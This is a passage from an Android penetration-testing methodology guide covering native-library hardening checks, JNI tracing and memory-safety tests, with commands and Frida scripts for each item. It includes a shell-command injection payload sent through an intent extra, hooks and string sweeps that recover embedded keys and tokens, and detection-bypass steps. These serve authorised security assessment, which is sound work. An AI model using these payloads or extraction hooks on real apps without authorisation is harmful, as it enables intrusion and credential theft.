| **Applies to** | **LEGACY** as a mitigation finding: Android has required PIE for dynamically linked executables since **Android 5.0 (API 21)**, and Clang builds PIE by default |
| **Maps to** | MASTG-TEST-0222 (Position Independent Code (PIC) Not Enabled — frontmatter `deprecated_since: 21`), MASTG-TECH-0115, MASWE-0045; MASVS-CODE-3 |

- **Test:** Check the ELF type on every shipped library. On a modern build a non-PIE result is almost never
  an exploitability finding — it is a **provenance signal** that somebody vendored a prebuilt binary built by
  a toolchain nobody in the project controls.
- **How:**
  ```bash
  for so in x/lib/*/*.so; do printf '%s ' "$so"; readelf -h "$so" | awk '/Type:/{print $2}'; done
  # DYN = position independent · EXEC = fixed load base
  rabin2 -I x/lib/arm64-v8a/libfoo.so | grep -E 'pic|pie'
  readelf -pcomment x/lib/arm64-v8a/libfoo.so 2>/dev/null | head -3   # which toolchain built it?
  ```
- **Proof:** `Type: EXEC` on a shipped `.so`, alongside a `.comment` section naming a different compiler
  from the rest of the app's libraries.
- **Escalation:** → D17 supply chain. A non-PIE, differently-toolchained library is a prebuilt third-party
  binary: identify it (D16-006), because it is very likely also unpatched. Historically, a fixed load base
  removed the need for an information leak entirely — up to Android 4.0 the dynamic linker itself sat at a fixed base (`0xb0001000`)
  and was the best gadget source on the platform; it has been randomised since 4.1.
- **Ruled out when:** every library reports `Type: DYN`. Say so in one line and move on — do not spend an
  item of report space on a mitigation the platform has enforced for a decade.

### D16-011 · Stack canaries absent — and the four documented false positives you must exclude first

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) |
| **Attacker** | n/a (rating input) |
| **Applies to** | all apps shipping native code; NDK builds get canaries by default, hand-rolled build systems often do not |
| **Maps to** | MASTG-TEST-0223 (Stack Canaries Not Enabled), MASTG-TECH-0115, MASTG-TECH-0157, MASTG-TOOL-0129, MASWE-0045; MASVS-CODE-3/4; Mobile Top 10 2024 M7 |

- **Test:** Count references to `__stack_chk_fail` in each library. Then throw out the four documented false
  positives before you write anything, because reporting them is how a tester loses credibility in this
  domain.
- **How:**
  ```bash
  for so in x/lib/arm64-v8a/*.so; do
    printf '%s canary_refs=%s\n' "$so" "$(readelf -sW "$so" | grep -c '__stack_chk_fail')"
  done
  rabin2 -I x/lib/arm64-v8a/libnative-lib.so | grep -E 'canary'
  ```
  **The exclusions, from MASTG-TEST-0223 itself:**
  1. **Flutter** does not use stack canaries — Dart mitigates buffer overflows differently. `libflutter.so`
     with `canary false` is expected, not a finding.
  2. React Native libraries such as `libruntimeexecutor.so` and `libreact_render_debug.so` are effectively
     **empty in release** and contain no symbols at all.
  3. `libreact_utils.so`, `libreact_config.so` and `libreact_debug.so` contain calls but **no stack buffers**,
     so the compiler emits no canary even though they were built with `-fstack-protector-strong`.
  4. Any function with no stack array gets no cookie by compiler heuristic; small arrays of structs/unions are
     sometimes skipped too. A zero count on a tiny shim library means nothing.
- **Proof:** `canary_refs=0` (or `canary false`) on a library that **parses untrusted input** — the
  qualifier is load-bearing. Quote the D16-005 row that shows the library is a parser in the same paragraph.
- **Escalation:** Missing canary + a reachable stack overflow (D16-020) = the exploitability argument inside a
  P1. Standalone it stays P5.
- **Ruled out when:** every parsing library has a non-zero `__stack_chk_fail` count, **or** the zero-count
  libraries are all on the exclusion list above and you name which exclusion applies to which library. A bare
  "canary: false" table with no exclusion pass is a false-positive report waiting to happen.

### D16-012 · FORTIFY verification — check for `_chk` symbols, not for a compiler flag

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) |
| **Attacker** | n/a (rating input) |
| **Applies to** | all native code; the platform has shipped `FORTIFY_SOURCE=1` since Android 4.2 and `=2` since 4.4, but that governs *platform* binaries, not the app's |
| **Maps to** | MASTG-TECH-0115, MASTG-KNOW-0006, MASWE-0045 |

- **Test:** `_FORTIFY_SOURCE` replaces `memcpy`/`strcpy`/`sprintf` with `__memcpy_chk`-style variants that
  carry a compile-time-known destination size and abort on overflow. You cannot read the flag from a shipped
  binary; you read the **imported symbols it produced**.
- **How:**
  ```bash
  for so in x/lib/*/*.so; do
    echo "== $so"
    nm -D "$so" 2>/dev/null | grep -E ' U __(memcpy|memmove|memset|strcpy|strncpy|strcat|sprintf|snprintf|vsprintf|read|poll|fgets)_chk'
    nm -D "$so" 2>/dev/null | grep -cE ' U (memcpy|strcpy|strcat|sprintf|gets)$'   # unfortified sinks
  done
  ```
  A library that imports **only** the plain forms while calling them on heap buffers is unfortified; a
  library that imports the `_chk` forms was built with FORTIFY, and any overflow you find there will
  `abort()` (SIGABRT with a `FORTIFY` abort message) rather than corrupt silently.
- **Proof:** The two counts side by side: zero `_chk` imports and a non-zero count of raw `memcpy`/`strcpy`
  imports on a library in the D16-005 parser list.
- **Escalation:** FORTIFY's presence *re-rates your own finding downward* — an overflow that hits
  `__memcpy_chk` is a controlled abort (DoS), not memory corruption. Its absence removes that stop.
  Either way it belongs in the D16-053 layer list.
- **Ruled out when:** every parsing library imports the `_chk` family for the sinks it uses, **or** you
  observed a FORTIFY abort message in a tombstone (`abort message: 'FORTIFY: memcpy: prevented ...'`) — which
  is direct runtime proof the mitigation is live on this build.

### D16-013 · Executable stack, executable heap and RWX mappings at runtime

| | |
|---|---|
| **Severity ceiling** | Low standalone; a direct exploitability multiplier |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) |
| **Attacker** | n/a (rating input) |
| **Applies to** | all; XN/NX has been enforced since Android 2.3, so a marked-executable stack is a build defect |
| **Maps to** | MASTG-KNOW-0006, MASWE-0045; MASTG-TECH-0044 (Process Exploration) |

- **Test:** Two separate questions. Statically: is `GNU_STACK` marked `RWE` (or absent)? Dynamically: does
  the running process hold any `rwxp` mapping — usually created by a JIT, a packer, or a library that
  `mprotect`s its own code?
- **How:**
  ```bash
  readelf -lW lib.so | grep -A1 GNU_STACK
  execstack -q lib.so                          # '-' NX · 'X' exec stack · '?' unmarked
  PID=$(adb shell pidof com.target.app)
  adb shell cat /proc/$PID/maps | grep rwxp
  ```
  Watch for a library creating one:
  ```javascript
  ['mmap','mprotect'].forEach(function (n) {
    var f = Module.findExportByName(null, n);
    if (f) Interceptor.attach(f, { onEnter(a) { console.log(n + ' len=' + a[1] + ' prot=' + a[2]); } });
  });
  ```
  `prot=7` (`PROT_READ|WRITE|EXEC`) on a region whose contents were just written is the shape that matters.
- **Proof:** An `rwxp` line in `/proc/<pid>/maps` attributed to a named module, or an `mprotect` trace adding
  `PROT_EXEC` to a region the app just filled.
- **Escalation:** An RWX region removes the need for ROP entirely — on Android there is no code signing on
  executable mappings, so the standard stager is `mmap` a fixed RWX page (`MAP_FIXED`) → `memcpy` the payload
  → jump. If the bytes written into that region come from the network, this stops being a mitigation item and
  becomes D17 (remote code delivery).
- **Ruled out when:** `GNU_STACK` is `RW` on every library and the running process shows no `rwxp` mapping
  after exercising the app's full flow, including any WebView, Hermes or Dart-JIT surface (those legitimately
  create executable mappings, so name the module before calling one a finding).

### D16-014 · Establish which platform mitigations are actually live on the test build

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (this is the evidence for the D16-053 layer list) |
| **Attacker** | n/a |
| **Applies to** | all; the answers are per-OS-version and per-device, and they change the severity of every memory finding in the chapter |
| **Maps to** | AOSP security-model Tables 4–5 (platform mitigations); `source.android.com/docs/security/enhancements`; MASTG-TECH-0044 |

- **Test:** Before rating anything, record which platform-side mitigations the *device under test* enforces.
  AOSP's list, by first version: ASLR (heap 4.0.2, linker + PIE 4.1), RELRO + BIND_NOW 4.1, `dmesg_restrict`
  and `kptr_restrict` 4.1, `FORTIFY_SOURCE=1` 4.2 / `=2` 4.4, SELinux enforcing 4.4, seccomp for untrusted
  apps 8.0, **CFI 9.0**, **ShadowCallStack / BoundSan / IntSan / Scudo / HWASan 10**, **MTE software support
  12**, Rust 12, **BTI and PAC-RET 14**.
- **How:**
  ```bash
  adb shell getprop ro.build.version.release ro.build.version.sdk ro.build.fingerprint
  adb shell getprop ro.build.version.security_patch
  PID=$(adb shell pidof com.target.app)
  adb shell cat /proc/$PID/status | grep -iE 'Seccomp|VmLck|TracerPid'
  adb shell cat /proc/sys/kernel/randomize_va_space
  adb shell cat /proc/$PID/maps | grep -cE 'scudo|\[anon:scudo'
  adb shell cat /proc/$PID/maps | grep -E '/apex/com.android.runtime|libc\.so'
  # which mainline modules are live (they decide which decoder CVEs are patched):
  adb shell pm list packages --apex-only | grep -E 'media|conscrypt|art'
  adb shell dumpsys package com.google.android.media.swcodec 2>/dev/null | grep -i version
  ```
- **Proof:** A recorded block containing the build fingerprint (it must end `user/release-keys` for the
  finding to be more than emulator-only), the security patch level, the seccomp state, and the ASLR setting.
  This block goes into every native finding you write.
- **Escalation:** It is the input to D16-053. It also tells you the honest ceiling: on a 14+ device with
  PAC-RET and BTI, a vtable hijack argument needs more than a pointer overwrite, and you must say so.
- **Ruled out when:** n/a — this item has no negative; it is unconditional evidence collection. If you cannot
  collect it because the app refuses to run on your harness, that goes on the blocked register.

### D16-015 · Debugging symbols, source paths and build machine paths left in the shipped binary

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `lack_of_binary_hardening.lack_of_obfuscation` (**P5**) standalone |
| **Attacker** | n/a (reconnaissance) |
| **Applies to** | all apps shipping native code |
| **Maps to** | MASTG-TEST-0288 (Debugging Symbols in Native Binaries), MASTG-TECH-0140, MASTG-KNOW-0008, MASTG-TOOL-0003 (nm), MASTG-TOOL-0129 (rabin2), MASTG-TOOL-0028 (radare2), MASWE-0061 (CWE-489, CWE-497, CWE-540, CWE-912, CWE-1295); MASVS-RESILIENCE-3 |

- **Test:** Unstripped `.so` files expose function names, variable names and source-file references, which
  hands the reverser the internal API for free. The finding is never "symbols present" — it is what a
  specific symbol or embedded path *reveals*.
- **How:**
  ```bash
  for so in x/lib/*/*.so; do
    echo "== $so"
    readelf -S "$so" | grep -E '\.debug_|\.symtab'
    nm -C "$so" 2>/dev/null | head -40
    diff <(nm "$so" 2>/dev/null) <(nm -a "$so" 2>/dev/null) | head    # empty => stripped
    rabin2 -s "$so" | head
  done
  r2 -A x/lib/arm64-v8a/libnative-lib.so     # then:  i~stripped,linenum,lsyms
  strings -a x/lib/*/*.so | grep -E '\.c$|\.cpp$|/home/|/Users/|/build/|/jenkins/|\.internal\.' | sort -u | head -30
  ```
- **Proof:** `stripped false` / `lsyms true` in radare2's `i` output, or a populated `SYMBOL TABLE` from
  `objdump --syms`, **plus** a concrete disclosure: an internal hostname, a build-server path, a developer's
  home directory, or the demangled name of the licence/attestation routine you subsequently bypass.
- **Escalation:** → D21 (symbols make the root/attestation check trivially locatable and hookable, which
  shortens the real finding); → D18 if an embedded path leaks an internal host or bucket name. Bundle this
  with `android:debuggable` (D02) and `setWebContentsDebuggingEnabled` (D10) into one "debug artefacts shipped
  to production" item rather than filing four separate Lows.
- **Ruled out when:** `readelf -S` shows no `.symtab` or `.debug_*` section in any shipped library and the
  `nm` diff is empty, **or** symbols are present but reveal nothing beyond ordinary library-internal names
  with no host, path or control-gating identifier among them — say which you checked.

### D16-016 · 16 KB page alignment and the toolchain-identity diff across libraries

| | |
|---|---|
| **Severity ceiling** | Low standalone; Medium–High as the lead-in to an unreviewed dependency swap |
| **VRT** | n/a standalone; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) or D17's path once you identify the swapped binary |
| **Attacker** | n/a (recon); AM-09 if the compat remedy downloads a replacement `.so` |
| **Applies to** | **Android 15+** devices with 16 KB pages; NDK apps must support 16 KB page sizes. `android:pageSizeCompat` needs the Android 16 SDK |
| **Maps to** | `developer.android.com/about/versions/15/behavior-changes-all` (16 KB page size support required for NDK apps); `developer.android.com/about/versions/16/behavior-changes-all` (`android:pageSizeCompat`); AOSP "16 KB page size support" |

- **Test:** A 16 KB-aligned library shows `0x4000` alignment on its LOAD segments; 4 KB shows `0x1000`. Mixed
  alignment across the app's libraries proves a **partial migration** — and during migration, teams bump
  NDK/toolchain versions and swap prebuilt third-party `.so` files. That swap is an unreviewed dependency
  update.
- **How:**
  ```bash
  for f in x/lib/arm64-v8a/*.so; do
    echo "== $f"
    readelf -lW "$f" | awk '/LOAD/ {print $NF}' | sort -u | head -3
    readelf -pcomment "$f" 2>/dev/null | head -3
  done
  adb shell getconf PAGE_SIZE
  grep -nE 'android:pageSizeCompat' x/AndroidManifest.xml
  ```
- **Proof:** Two alignment values across libraries in the same APK, or one `.so` whose `.comment` section
  names a different toolchain from the rest — pointing at a prebuilt binary nobody audited. Pair it with
  `getconf PAGE_SIZE` = `16384` on the test device to show the compatibility path is live.
- **Escalation:** → D17: some apps respond to the 16 KB break by **downloading** a corrected library at
  runtime. If that download is unpinned or unsigned, it is remote code delivery and the rating comes from
  there, not from alignment. Also re-run D16-006 against every library whose build identity changed.
- **Ruled out when:** every LOAD segment in every shipped library reports `0x4000` alignment and all
  `.comment` strings name the same toolchain, i.e. one coherent build. Alternatively, the app ships no native
  code at all (D16-001).

### D16-017 · Trace the JNI boundary with jnitrace before disassembling anything

| | |
|---|---|
| **Severity ceiling** | Support (High when the trace itself yields a secret — file that under D12/D18) |
| **VRT** | n/a as a technique; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the trace recovers a live backend credential |
| **Attacker** | AM-12 for the trace (evidence tool); the finding is what the trace reveals |
| **Applies to** | all apps with bundled `.so` |
| **Maps to** | MASTG-TECH-0035 (JNI Tracing), MASTG-TECH-0034 (Native Code Tracing), MASTG-TECH-0033 (Method Tracing), MASTG-TOOL-0107 (jnitrace), MASTG-TOOL-0001 (Frida), MASTG-TOOL-0037 (RMS) |

- **Test:** Every JNI function receives the `JNIEnv*` interface pointer. Tracing calls through it reveals the
  strings native code creates, the Java methods it calls back, the fields it reads and the buffers it copies
  — without disassembling a single instruction, and including the methods bound by `RegisterNatives`.
- **How:**
  ```bash
  pip install jnitrace
  jnitrace -l libtarget.so com.target.app | tee jni.log
  jnitrace -l '*' com.target.app | tee jni-all.log          # noisy; use once, then narrow
  grep -E 'NewStringUTF|GetStringUTFChars|GetByteArrayElements|GetArrayLength|CallObjectMethod|GetStaticFieldID|SetByteArrayRegion' jni.log
  # generic native tracing when jnitrace is blocked or the symbol is stripped
  frida-trace -U -i 'Java_*' com.target.app
  frida-trace -U -i 'open' -i 'memcpy' -i 'strcpy' -i 'sprintf' com.target.app
  frida-trace -p 1372 -a 'libtarget.so!0x4793c'             # stripped: trace by address
  frida-trace -U -j '*!*certificate*/isu' com.target.app    # Java side, case-insensitive, with signatures
  ```
  `frida-trace` writes an editable handler per matched function under `__handlers__/<module>/<fn>.js`; edit
  `onLeave` to capture return values:
  ```javascript
  {
    onEnter: function (log, args, state) {
      log('decode(buf=' + args[3] + ', len=' + args[4].toInt32() + ')');
      if (!args[4].isNull()) log(hexdump(args[3], { length: Math.min(64, args[4].toInt32()) }));
    },
    onLeave: function (log, retval, state) { log('\t return: ' + retval); }
  }
  ```
- **Proof:** A trace line showing your own input arriving — `GetByteArrayElements` returning a buffer whose
  first bytes are your marker, followed by `GetArrayLength` and the length the native side then uses.
  jnitrace also prints the backtrace of the JNI call site, which gives you the Java caller for free.
- **Escalation:** A `NewStringUTF` carrying a key or endpoint → D12/D18. A `CallObjectMethod` where native
  code invokes a Java crypto API → D12. A length read from the array but a *different* length used in the
  copy → D16-018.
- **Ruled out when:** jnitrace runs to completion across the app's native-touching flows and shows only
  fixed-size, app-generated data crossing the boundary (no attacker-influenced string, array or length), and
  you name the flows you exercised. If jnitrace produces nothing because the app killed the Frida server,
  that is D21 blocking coverage, not a negative.

### D16-018 · Length, offset and size values crossing JNI that native code trusts

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with demonstrated execution; `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (**P3**) for a reliable crash only |
| **Attacker** | AM-03 / AM-02 / AM-01 per the D16-005 row |
| **Applies to** | any JNI entry taking `(byte[], int, int)`, `(ByteBuffer, int)`, a `long` size, or a `String` it copies into a fixed buffer |
| **Maps to** | MASTG-KNOW-0005, MASWE-0050 (CWE-20), MASTG-TECH-0018 (Disassembling Native Code), MASTG-TECH-0024 (Reviewing Disassembled Native Code); CWE-787, CWE-125; ATT&CK T1575 |

- **Test:** Java bounds-checks arrays; C does not. The classic defect is a JNI method that receives a buffer
  plus an offset/length pair and uses the caller's numbers instead of `GetArrayLength()`. Test the
  three boundaries: `len > actual`, `offset` negative, and `offset + len` wrapping.
- **How:** Find the shape statically, then drive it:
  ```bash
  grep -rnE 'native .*\(byte\[\]|native .*\(java\.nio\.ByteBuffer|native .*\(\[BII' out/sources/ | head -40
  # in the disassembly, look for the length being used without a GetArrayLength comparison
  r2 -A x/lib/arm64-v8a/libtarget.so
  # [0x0]> afl ; axt @ sym.imp.memcpy ; axt @ sym.imp.GetArrayLength
  ```
  Call the entry directly from an instrumented process — this is for *triage*, not for the report (see
  D16-045):
  ```javascript
  Java.perform(function () {
    var C = Java.use('com.target.Codec');
    var b = Java.array('byte', [0x41, 0x41, 0x41, 0x41]);
    [[0, 4], [0, 0x7fffffff], [-1, 4], [0x7ffffffe, 4], [2, -1]].forEach(function (p) {
      try { console.log(p + ' -> ' + C.decode(b, p[0], p[1])); }
      catch (e) { console.log(p + ' -> ' + e); }
    });
  });
  ```
  Then reproduce the same values through the **real** surface from D16-005 (an intent extra, a deep-link
  parameter, a `content://` file) and capture the tombstone (D16-048).
- **Proof:** A tombstone whose `fault addr` is derived from the offset/length you supplied — e.g.
  `signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x41414141` — with `pc` inside the app's own `.so`,
  plus the exact `am start` / `content call` line that produced it.
- **Escalation:** → `server_side_injection.remote_code_execution_rce` (P1) once you demonstrate control
  (D16-033, D16-053). → D11/D13: execution in the app UID reads the app's private storage and its session
  material without root.
- **Ruled out when:** the native side calls `GetArrayLength()` (or `GetDirectBufferCapacity`) and compares
  before every copy — read the disassembly or trace the call in jnitrace and show the comparison — **or** the
  Java wrapper validates and the native entry is `private` with no other caller. The second half matters:
  see D16-019 before you accept a Java-side check as the answer.

### D16-019 · The layer-ordering trap at the JNI boundary — a Java-side rejection does not prove the native parser is safe

| | |
|---|---|
| **Severity ceiling** | Support (it is the discipline that prevents a false negative *and* a false positive) |
| **VRT** | n/a |
| **Attacker** | n/a (methodology) |
| **Applies to** | every app where a Java wrapper validates before calling a native method |
| **Maps to** | MASWE-0050; the general layer-ordering discipline (cf. D13/D15) |

- **Test:** Two symmetrical mistakes live here. (1) **False negative:** you send an oversized length, the
  *Java* wrapper throws `IllegalArgumentException`, and you conclude the native code is bounded. It is not —
  you never reached it. (2) **False positive:** you call the native method directly with Frida, it crashes,
  and you report a memory-safety bug that no real caller can reach. Establish *which layer* rejected you, the
  same way you would establish whether a 400 came from a body parser or from auth.
- **How:** Run the same input three ways and diff the observable:
  ```bash
  # (a) through the real surface
  adb shell am start -n com.target/.ImportActivity --es blob "$(python3 -c 'print("A"*100000)')"
  adb logcat -d | grep -E 'IllegalArgument|IndexOutOfBounds|SIGSEGV|target'
  ```
  ```javascript
  // (b) at the Java wrapper, to see whether the wrapper or the native side rejected
  Java.perform(function () {
    var C = Java.use('com.target.Codec');
    C.decode.overload('[B', 'int', 'int').implementation = function (b, o, l) {
      console.log('[wrapper] entered o=' + o + ' l=' + l);
      var r = this.decode(b, o, l); console.log('[wrapper] returned'); return r;
    };
  });
  // (c) at the native symbol, to prove the bytes crossed
  Interceptor.attach(Module.getExportByName('libtarget.so','Java_com_target_Codec_decode'), {
    onEnter(a) { console.log('[native] entered len=' + a[4].toInt32()); }
  });
  ```
- **Proof:** The three-line sequence. `[wrapper] entered` **without** `[native] entered` means the Java layer
  rejected it and your native claim is unproven. `[native] entered` followed by a tombstone means the bytes
  crossed and the finding is real. Quote both lines in the report.
- **Escalation:** If only the Java wrapper rejects, look for a **second caller** of the same native method
  that skips the wrapper — a sibling class, a reflection call, a `RegisterNatives` binding, or a
  cross-platform bridge (D16-041). That sibling is the finding.
- **Ruled out when:** the native symbol hook never fires for any out-of-range input across every caller you
  enumerated in D16-005, i.e. every path into the native method is gated by the same validated wrapper.
  Name the wrapper class and `file:line`.

### D16-020 · Unsafe C string and memory sinks reachable from a JNI entry point

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; **P3** for a reliable crash; nothing at all for an unreached sink |
| **Attacker** | AM-03 / AM-02 per the D16-005 row |
| **Applies to** | all apps with native code processing untrusted input |
| **Maps to** | MASTG-KNOW-0005, MASTG-TECH-0018, MASTG-TECH-0024, MASTG-TOOL-0033 (Ghidra), MASTG-TOOL-0030 (Angr), MASTG-TOOL-0152 (lldb), MASWE-0050; CWE-787, CWE-122 |

- **Test:** Enumerate the classic overflow-prone imports, then — and only then — determine whether any of
  them sits on a path from a JNI entry in your reachability table. The presence of `strcpy` in a `.so` is
  noise; `strcpy` two call frames from `Java_com_target_Codec_decode` is a finding candidate.
- **How:**
  ```bash
  for so in x/lib/arm64-v8a/*.so; do
    echo "== $so"
    nm -D "$so" 2>/dev/null | grep -E ' U (strcpy|strcat|strncpy|sprintf|vsprintf|gets|memcpy|memmove|alloca|system|popen|execve)$'
  done
  ```
  Then walk the cross-references from the sink back to the entry:
  ```bash
  r2 -A x/lib/arm64-v8a/libtarget.so
  # [0x0]> afl                    # function list
  # [0x0]> axt @ sym.imp.memcpy   # every caller of memcpy
  # [0x0]> axt @ sym.imp.strcpy
  # [0x0]> /c strcpy ; /c sprintf ; /c alloca
  # [0x0]> s sym.Java_com_target_Codec_decode ; afl. ; agc   # call graph from the entry
  ```
  Symbolic execution is the shortcut when the path is long: `MASTG-TECH-0037` with `MASTG-TOOL-0030` (Angr)
  to find an input that reaches the sink.
- **Proof:** The cross-reference chain, written as `Java_com_target_Codec_decode → sub_12a40 → memcpy(dst,
  src, len)` with the source of `len` identified, plus the resulting tombstone when you drive it.
- **Escalation:** → D16-029 (does the stack cookie even apply?), → D16-033 (turn the write into control), →
  D16-053 (what stops you).
- **Ruled out when:** the reachable JNI entries' call graphs contain no unbounded sink — every copy uses a
  `_chk` variant or a length derived from `GetArrayLength()` — and you show the call graph. "No `strcpy` in
  the binary" is not a negative; modern compilers inline it.

### D16-021 · Native `system()` / `popen()` / `Runtime.exec` with concatenated attacker input

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_os_firmware.command_injection` (**P1**, CWE-77) or `server_side_injection.remote_code_execution_rce` (**P1**) |
| **Attacker** | AM-03 / AM-02 |
| **Applies to** | all; native shell-outs are common in media SDKs, log uploaders and updater components |
| **Maps to** | ATT&CK T1623.001 (Unix Shell — detection analytic AN1657 names the observables: "Runtime or ProcessBuilder invocation, spawn of sh/toybox/toolbox/su or equivalent shell process"), T1623 (analytic AN1741 for Android), T1575; CWE-77 |

- **Test:** Does the app shell out at all — from Java or from native — and does any attacker-influenced
  string reach the command line? This is the cheapest Critical in the chapter when it exists, because no
  memory-safety argument is required.
- **How:**
  ```bash
  grep -rn 'Runtime.getRuntime()\.exec\|ProcessBuilder' out/sources/ | head -30
  grep -rn 'Runtime;->exec\|ProcessBuilder' out/smali/ | head -30
  strings -a x/lib/*/*.so | grep -E '^/system/bin/(sh|toolbox|toybox)$|^popen$|^system$|sh -c' | sort -u
  nm -D x/lib/*/*.so | grep -E ' U (system|popen|execve|execl|fork)$'
  frida-trace -U -f com.target.app -i 'execve' -i 'popen' -i 'system' --no-pause
  ```
  Inject a separator through the reachable parameter and read the result back from inside the app's sandbox:
  ```bash
  adb shell am start -n com.target/.ExportedActivity \
    --es path '/sdcard/a.log; id > /data/data/com.target.app/files/PWNED'
  adb shell run-as com.target.app cat files/PWNED
  ```
- **Proof:** The marker file containing `uid=10xxx(u0_aXXX)` matching the target's UID. That single line is
  the whole proof and it shows execution in the app's context — nothing else is needed.
- **Escalation:** → D17 for persistence (write a `.so`/DEX the app later loads). If the app ever invokes
  `su`, note the amplification but **rate the base case on the app UID** — a rooted device is not an attacker
  model.
- **Ruled out when:** no `exec`/`system`/`popen` import exists in any shipped `.so` and no
  `Runtime.exec`/`ProcessBuilder` call site exists in the DEX, **or** every call site passes a fixed argument
  array (not a concatenated string) with no attacker-influenced element — shown at `file:line`.

### D16-022 · Secrets and request-signing keys recovered at the JNI boundary

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) when the recovered key authenticates to a production backend; `.for_internal_asset` (P3) for an internal-only one |
| **Attacker** | AM-12 recovers it; the **impact** is AM-01 — anyone can then forge requests from outside the app |
| **Applies to** | all apps that "moved the key into C++" |
| **Maps to** | MASTG-TECH-0035, MASTG-TOOL-0107, MASTG-TOOL-0001; CWE-798; VRT `sensitive_data_exposure.disclosure_of_secrets` |

- **Test:** "Native = protected" is false. A key in `libnative.so` is no harder to recover than one in
  `strings.xml` — it is one `strings` run or one `onLeave` hook away. The severity comes from what the key
  authorises, not from where it was hidden.
- **How:**
  ```bash
  strings -a -n 8 x/lib/arm64-v8a/libnative.so | \
    grep -iE 'key|secret|token|passw|hmac|https?://|Bearer|AKIA|AIza|sk_live' | head -40
  nm -D --defined-only x/lib/arm64-v8a/libnative.so | head -50
  ```
  When the value is derived rather than stored, take it at the boundary:
  ```javascript
  Interceptor.attach(Module.getExportByName('libnative.so', 'Java_com_target_NativeBridge_getSecret'), {
    onLeave(ret) {
      console.log('[ret] ' + Java.vm.getEnv().getStringUtfChars(ret, null).readCString());
    }
  });
  // or the generic crypto boundary
  Interceptor.attach(Module.getExportByName('libnative.so', 'decrypt'), {
    onEnter(a) { console.log('[+] in : ' + a[0].readUtf8String()); },
    onLeave(r) { console.log('[+] out: ' + r.readUtf8String()); }
  });
  Module.enumerateExports('libnative.so').forEach(e => console.log(e.name + ' @ ' + e.address));
  ```
  ```bash
  jnitrace -l libnative.so com.target.app | grep -A3 NewStringUTF
  frida-trace -U -i 'decrypt' com.target.app
  ```
- **Proof:** The plaintext value printed from the running app **and** an out-of-band validation: the key
  produces a signature the backend accepts, or returns 200 from the vendor API. A recovered string with no
  demonstrated use is Informational.
- **Escalation:** → D12 (key management) for the storage decision; → D15 for the real impact — a recovered
  **request-signing** key lets an attacker forge valid requests from outside the app, which un-gates every
  other API finding in the engagement and is frequently the highest-value outcome of a mobile assessment.
  It is also the bridge to the shadow-API work: the signing key is what lets you exercise the app's older,
  weaker backend version behaviourally (D15).
- **Ruled out when:** the `strings` sweep is clean, the JNI trace shows no credential-shaped return, and the
  request-signing material is fetched per-session from an authenticated endpoint rather than embedded —
  evidenced by the trace showing the value arriving from the network, not from the binary.

### D16-023 · Native anti-fraud, root-detection and pinning libraries: do they gate anything?

| | |
|---|---|
| **Severity ceiling** | Low (Medium only when it materially protects payments, DRM or anti-fraud) |
| **VRT** | `lack_of_binary_hardening.lack_of_jailbreak_detection` (**P5**) / `.runtime_instrumentation_based` (**P5**) — this is the P5 ceiling stated plainly |
| **Attacker** | AM-12 (the bypass is on your own device) |
| **Applies to** | apps shipping `libtoolChecker`-style detection natives, commercial RASP, or native TLS pinning |
| **Maps to** | MASVS-RESILIENCE-3; MASTG-TECH-0034, MASTG-TOOL-0036 (r2frida); Mobile Top 10 2024 M7 |

- **Test:** Do not report "root detection can be bypassed" — that is P5 by definition. The only question worth
  answering is whether the native detection result **gates a security decision**. Trace the return value to a
  decision point.
- **How:**
  ```bash
  nm -D x/lib/*/*.so | grep -iE 'root|jail|emul|debug|tamper|integrity|attest'
  strings -a x/lib/*/*.so | grep -E '^/system/(bin|xbin)/su$|magisk|frida|/proc/self/maps|ro.debuggable'
  ```
  Watch the libc calls the check actually makes, which is faster than reversing it:
  ```javascript
  ['fopen','open','access','stat','lstat','system','popen'].forEach(function (fn) {
    var p = Module.findExportByName('libc.so', fn); if (!p) return;
    Interceptor.attach(p, {
      onEnter(a) { this.path = a[0].readUtf8String(); },
      onLeave(r) { console.log('[' + fn + '] ' + this.path + ' -> ' + r); }
    });
  });
  ```
  Then flip the result and see what changes:
  ```bash
  r2 frida://attach/usb//com.target.app      # :il to find the module, :dm for its map
  ```
- **Proof:** Either (a) the detection return value flows into a payment/DRM/login branch — quote the branch
  at `file:line` and show the app behaving differently when you flip it; or (b) it flows only into an
  analytics event, in which case you have a **Low** with an honest statement that the control is decorative.
  The worked calibration in this corpus: a retail app's native anti-fraud libraries were **analytics-only**,
  making them trivially bypassable and worth a Low.
- **Escalation:** → D21 for the resilience write-up; → D23 if it gates payments and the bypass enables
  fraud; → D14 if the "detection" is actually native certificate pinning, in which case the bypass is a
  tester-convenience (AM-07) and not a finding.
- **Ruled out when:** the detection result reaches a server-side decision (the app reports the verdict and
  the *backend* refuses the transaction) — verified by flipping the client verdict and observing the server
  still refuse. That is the one configuration where client-side detection is not decorative, and it is a
  clean negative worth writing down.

### D16-024 · `int * int` size arithmetic — the highest-yield memory-safety grep in this chapter

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; **P3** for a reliable crash |
| **Attacker** | AM-01 / AM-02 for a decoder fed by a delivered file; AM-03 when the Java API that sets the sizes is reachable cross-app |
| **Applies to** | any allocation or loop bound computed from two attacker-controlled 32-bit values |
